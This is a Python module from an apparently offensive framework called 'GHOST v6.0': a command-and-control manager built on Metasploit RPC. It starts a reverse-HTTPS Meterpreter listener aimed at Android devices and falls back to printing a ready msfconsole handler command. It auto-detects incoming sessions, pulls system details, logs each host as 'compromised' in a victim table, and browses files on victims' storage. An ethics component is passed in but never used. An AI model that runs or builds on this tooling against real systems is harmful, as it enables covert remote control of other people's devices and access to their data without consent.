"""
GHOST v6.0 — C2 Session Manager (Enhanced)
Handles real Meterpreter interactions via pymetasploit3 MsfRpcClient.
Falls back to mock mode if msfrpcd is unreachable.
Manages victim table, metadata extraction, session polling, and payload persistence.
"""

import os
import time
import uuid
import logging
import threading

logger = logging.getLogger("ghost.c2")

# Try to import pymetasploit3 for real RPC
try:
    from pymetasploit3.msfrpc import MsfRpcClient
    MSFRPC_AVAILABLE = True
except ImportError:
    MSFRPC_AVAILABLE = False
    logger.info("pymetasploit3 not installed — C2 Manager running in PLAN-ONLY mode")


class C2Manager:
    """
    Manages Metasploit RPC connections and incoming reverse shells/Meterpreter sessions.
    Enhancement #5: Real pymetasploit3 integration with session auto-detection.
    """

    def __init__(self, memory_manager, ethics_engine, bridge):
        self.memory = memory_manager
        self.ethics = ethics_engine
        self.bridge = bridge
        self.sessions = {}
        self.msf_host = os.environ.get("MSF_RPC_HOST", "127.0.0.1")
        self.msf_port = int(os.environ.get("MSF_RPC_PORT", "55553"))
        self.msf_pass = os.environ.get("MSF_RPC_PASS", "msf")
        self.msf_client = None
        self._poll_thread = None
        self._polling = False

        # Try to connect to msfrpcd on init
        self._connect_rpc()

    @property
    def connected(self):
        """Check if we have a live RPC connection."""
        return self.msf_client is not None

    def _connect_rpc(self):
        """Attempt connection to msfrpcd."""
        if not MSFRPC_AVAILABLE:
            return False

        try:
            self.msf_client = MsfRpcClient(
                self.msf_pass,
                server=self.msf_host,
                port=self.msf_port,
                ssl=False,
            )
            logger.info(
                f"C2 Manager ONLINE — Connected to msfrpcd at "
                f"{self.msf_host}:{self.msf_port} "
                f"(MSF v{self.msf_client.core.version.get('version', '?')})"
            )
            return True
        except Exception as e:
            logger.info(f"msfrpcd not reachable ({e}) — C2 running in PLAN-ONLY mode")
            self.msf_client = None
            return False

    def start_listener(self, lhost="0.0.0.0", lport=4444, payload="android/meterpreter/reverse_https"):
        """
        Start a background multi/handler listener.
        If RPC is connected, starts via API. Otherwise generates msfconsole command.
        """
        job_id = str(uuid.uuid4())[:8]

        # Try real RPC first
        if self.msf_client:
            try:
                exploit = self.msf_client.modules.use("exploit", "exploit/multi/handler")
                exploit["PAYLOAD"] = payload
                exploit["LHOST"] = lhost
                exploit["LPORT"] = lport
                exploit["ExitOnSession"] = False
                result = exploit.execute(payload=payload)
                real_job_id = result.get("job_id", job_id)
                logger.info(f"Listener started via RPC — job_id={real_job_id}, port={lport}")

                # Start session polling
                self.start_polling()

                return {
                    "type": "c2_listener_start",
                    "job_id": str(real_job_id),
                    "status": "RUNNING",
                    "method": "msfrpc",
                    "payload": payload,
                    "lhost": lhost,
                    "lport": lport,
                }
            except Exception as e:
                logger.warning(f"RPC listener start failed ({e}), falling back to command mode")

        # Fallback: generate msfconsole command
        return {
            "type": "c2_listener_start",
            "job_id": job_id,
            "status": "PLAN",
            "method": "command",
            "phases": [
                {
                    "phase": 1,
                    "name": "Initialize Metasploit Listener",
                    "commands": [
                        {
                            "tool": "msfconsole",
                            "args": f"-q -x 'use exploit/multi/handler; set PAYLOAD {payload}; set LHOST {lhost}; set LPORT {lport}; set ExitOnSession false; exploit -j'",
                            "category": "C2",
                            "description": f"Start background listener on port {lport}",
                            "background": True,
                        }
                    ],
                }
            ],
        }

    def evaluate_session(self, session_id):
        """
        Enhancement #5: Real session evaluation via pymetasploit3.
        Extracts sysinfo, uid, networking from a live Meterpreter session.
        Falls back to local session cache if RPC unavailable.
        """
        # Try real RPC extraction
        if self.msf_client:
            try:
                session = self.msf_client.sessions.session(str(session_id))
                session_info = session.info if hasattr(session, 'info') else {}

                # Extract sysinfo via Meterpreter
                sysinfo = {}
                try:
                    shell = self.msf_client.sessions.session(str(session_id))
                    shell.write("sysinfo")
                    time.sleep(1.5)
                    output = shell.read()
                    # Parse sysinfo output
                    for line in output.split("\n"):
                        if ":" in line:
                            key, val = line.split(":", 1)
                            sysinfo[key.strip().lower()] = val.strip()
                except Exception:
                    pass

                session_data = {
                    "id": session_id,
                    "type": session_info.get("type", "meterpreter"),
                    "tunnel_local": session_info.get("tunnel_local", ""),
                    "tunnel_peer": session_info.get("tunnel_peer", ""),
                    "via_exploit": session_info.get("via_exploit", ""),
                    "via_payload": session_info.get("via_payload", ""),
                    "arch": sysinfo.get("architecture", session_info.get("arch", "unknown")),
                    "os": sysinfo.get("os", session_info.get("platform", "unknown")),
                    "computer": sysinfo.get("computer name", ""),
                    "domain": sysinfo.get("domain", ""),
                    "logged_on_users": sysinfo.get("logged on users", ""),
                    "connected_at": time.time(),
                    "source": "msfrpc",
                }

                self.sessions[session_id] = session_data

                # Auto-update session discovered hosts
                peer = session_data.get("tunnel_peer", "")
                if peer and ":" in peer:
                    target_ip = peer.split(":")[0]
                    session_context = self.memory.get_session()
                    existing_ips = {h.get("ip") for h in session_context.get("discovered_hosts", [])}
                    if target_ip not in existing_ips:
                        session_context.setdefault("discovered_hosts", []).append({
                            "ip": target_ip,
                            "hostname": session_data.get("computer", ""),
                            "os": session_data.get("os", ""),
                            "ports": [],
                            "services": [],
                            "status": "compromised",
                        })
                        self.memory.update_session(session_context)

                    # Register shell
                    self.memory.add_shell(
                        session_data.get("type", "meterpreter"),
                        target_ip,
                        pid=session_id,
                    )

                logger.info(
                    f"Session {session_id} evaluated: "
                    f"{session_data['os']} / {session_data['arch']} "
                    f"via {session_data['via_exploit']}"
                )
                return session_data

            except Exception as e:
                logger.warning(f"RPC session evaluation failed for {session_id}: {e}")

        # Fallback: return cached session or minimal info
        if session_id in self.sessions:
            return self.sessions[session_id]

        session_data = {
            "id": session_id,
            "arch": "unknown",
            "os": "unknown",
            "connected_at": time.time(),
            "source": "cache",
        }
        self.sessions[session_id] = session_data
        return session_data

    def start_polling(self, interval=5):
        """
        Enhancement #5: Start background thread that polls msfrpcd
        for new sessions. Auto-evaluates incoming callbacks.
        """
        if self._polling or not self.msf_client:
            return

        self._polling = True

        def _poll_loop():
            known_ids = set(self.sessions.keys())
            while self._polling and self.msf_client:
                try:
                    current_sessions = self.msf_client.sessions.list
                    for sid, info in current_sessions.items():
                        if sid not in known_ids:
                            logger.info(f"🎯 NEW SESSION DETECTED: {sid} — auto-evaluating...")
                            known_ids.add(sid)
                            self.evaluate_session(sid)

                            # Emit to frontend
                            if hasattr(self.bridge, 'socketio') and self.bridge.socketio:
                                self.bridge.socketio.emit("c2_session_callback", {
                                    "session_id": sid,
                                    "info": self.sessions.get(sid, {}),
                                })
                except Exception as e:
                    logger.debug(f"Session poll error: {e}")

                time.sleep(interval)

        self._poll_thread = threading.Thread(target=_poll_loop, daemon=True)
        self._poll_thread.start()
        logger.info(f"C2 session polling started (interval={interval}s)")

    def stop_polling(self):
        """Stop the session polling thread."""
        self._polling = False

    def build_file_browse_plan(self, session_id, path="/sdcard"):
        """Translate file management to Meterpreter commands."""
        if session_id not in self.sessions:
            logger.warning(
                "[C2Manager] build_file_browse_plan called for unknown session '%s'. "
                "Proceeding without session metadata validation.", session_id
            )

        # If we have RPC, execute directly
        if self.msf_client and session_id in self.sessions:
            try:
                shell = self.msf_client.sessions.session(str(session_id))
                shell.write(f"ls {path}")
                time.sleep(1.0)
                output = shell.read()
                return {
                    "type": "c2_file_browse",
                    "session_id": session_id,
                    "path": path,
                    "output": output,
                    "method": "msfrpc",
                }
            except Exception as e:
                logger.warning(f"RPC file browse failed: {e}")

        # Fallback: command plan
        return {
            "type": "c2_file_browse",
            "session_id": session_id,
            "method": "command",
            "phases": [
                {
                    "phase": 1,
                    "name": f"Browse {path}",
                    "commands": [
                        {
                            "tool": "msfconsole",
                            "args": f"-x 'sessions -i {session_id} -C \"cd {path}; ls\"'",
                            "category": "C2",
                        }
                    ],
                }
            ],
        }

    def get_sessions(self):
        """Return the Victim Table. Syncs with msfrpcd if connected."""
        if self.msf_client:
            try:
                live = self.msf_client.sessions.list
                for sid, info in live.items():
                    if sid not in self.sessions:
                        self.sessions[sid] = {
                            "id": sid,
                            "type": info.get("type", "?"),
                            "tunnel_peer": info.get("tunnel_peer", ""),
                            "via_exploit": info.get("via_exploit", ""),
                            "os": info.get("platform", "?"),
                            "connected_at": time.time(),
                            "source": "msfrpc",
                        }
            except Exception:
                pass

        return self.sessions

    def get_status(self):
        """Return C2 Manager status for the dashboard."""
        return {
            "connected": self.connected,
            "method": "msfrpc" if self.connected else "plan-only",
            "active_sessions": len(self.sessions),
            "polling": self._polling,
            "msf_host": f"{self.msf_host}:{self.msf_port}",
        }
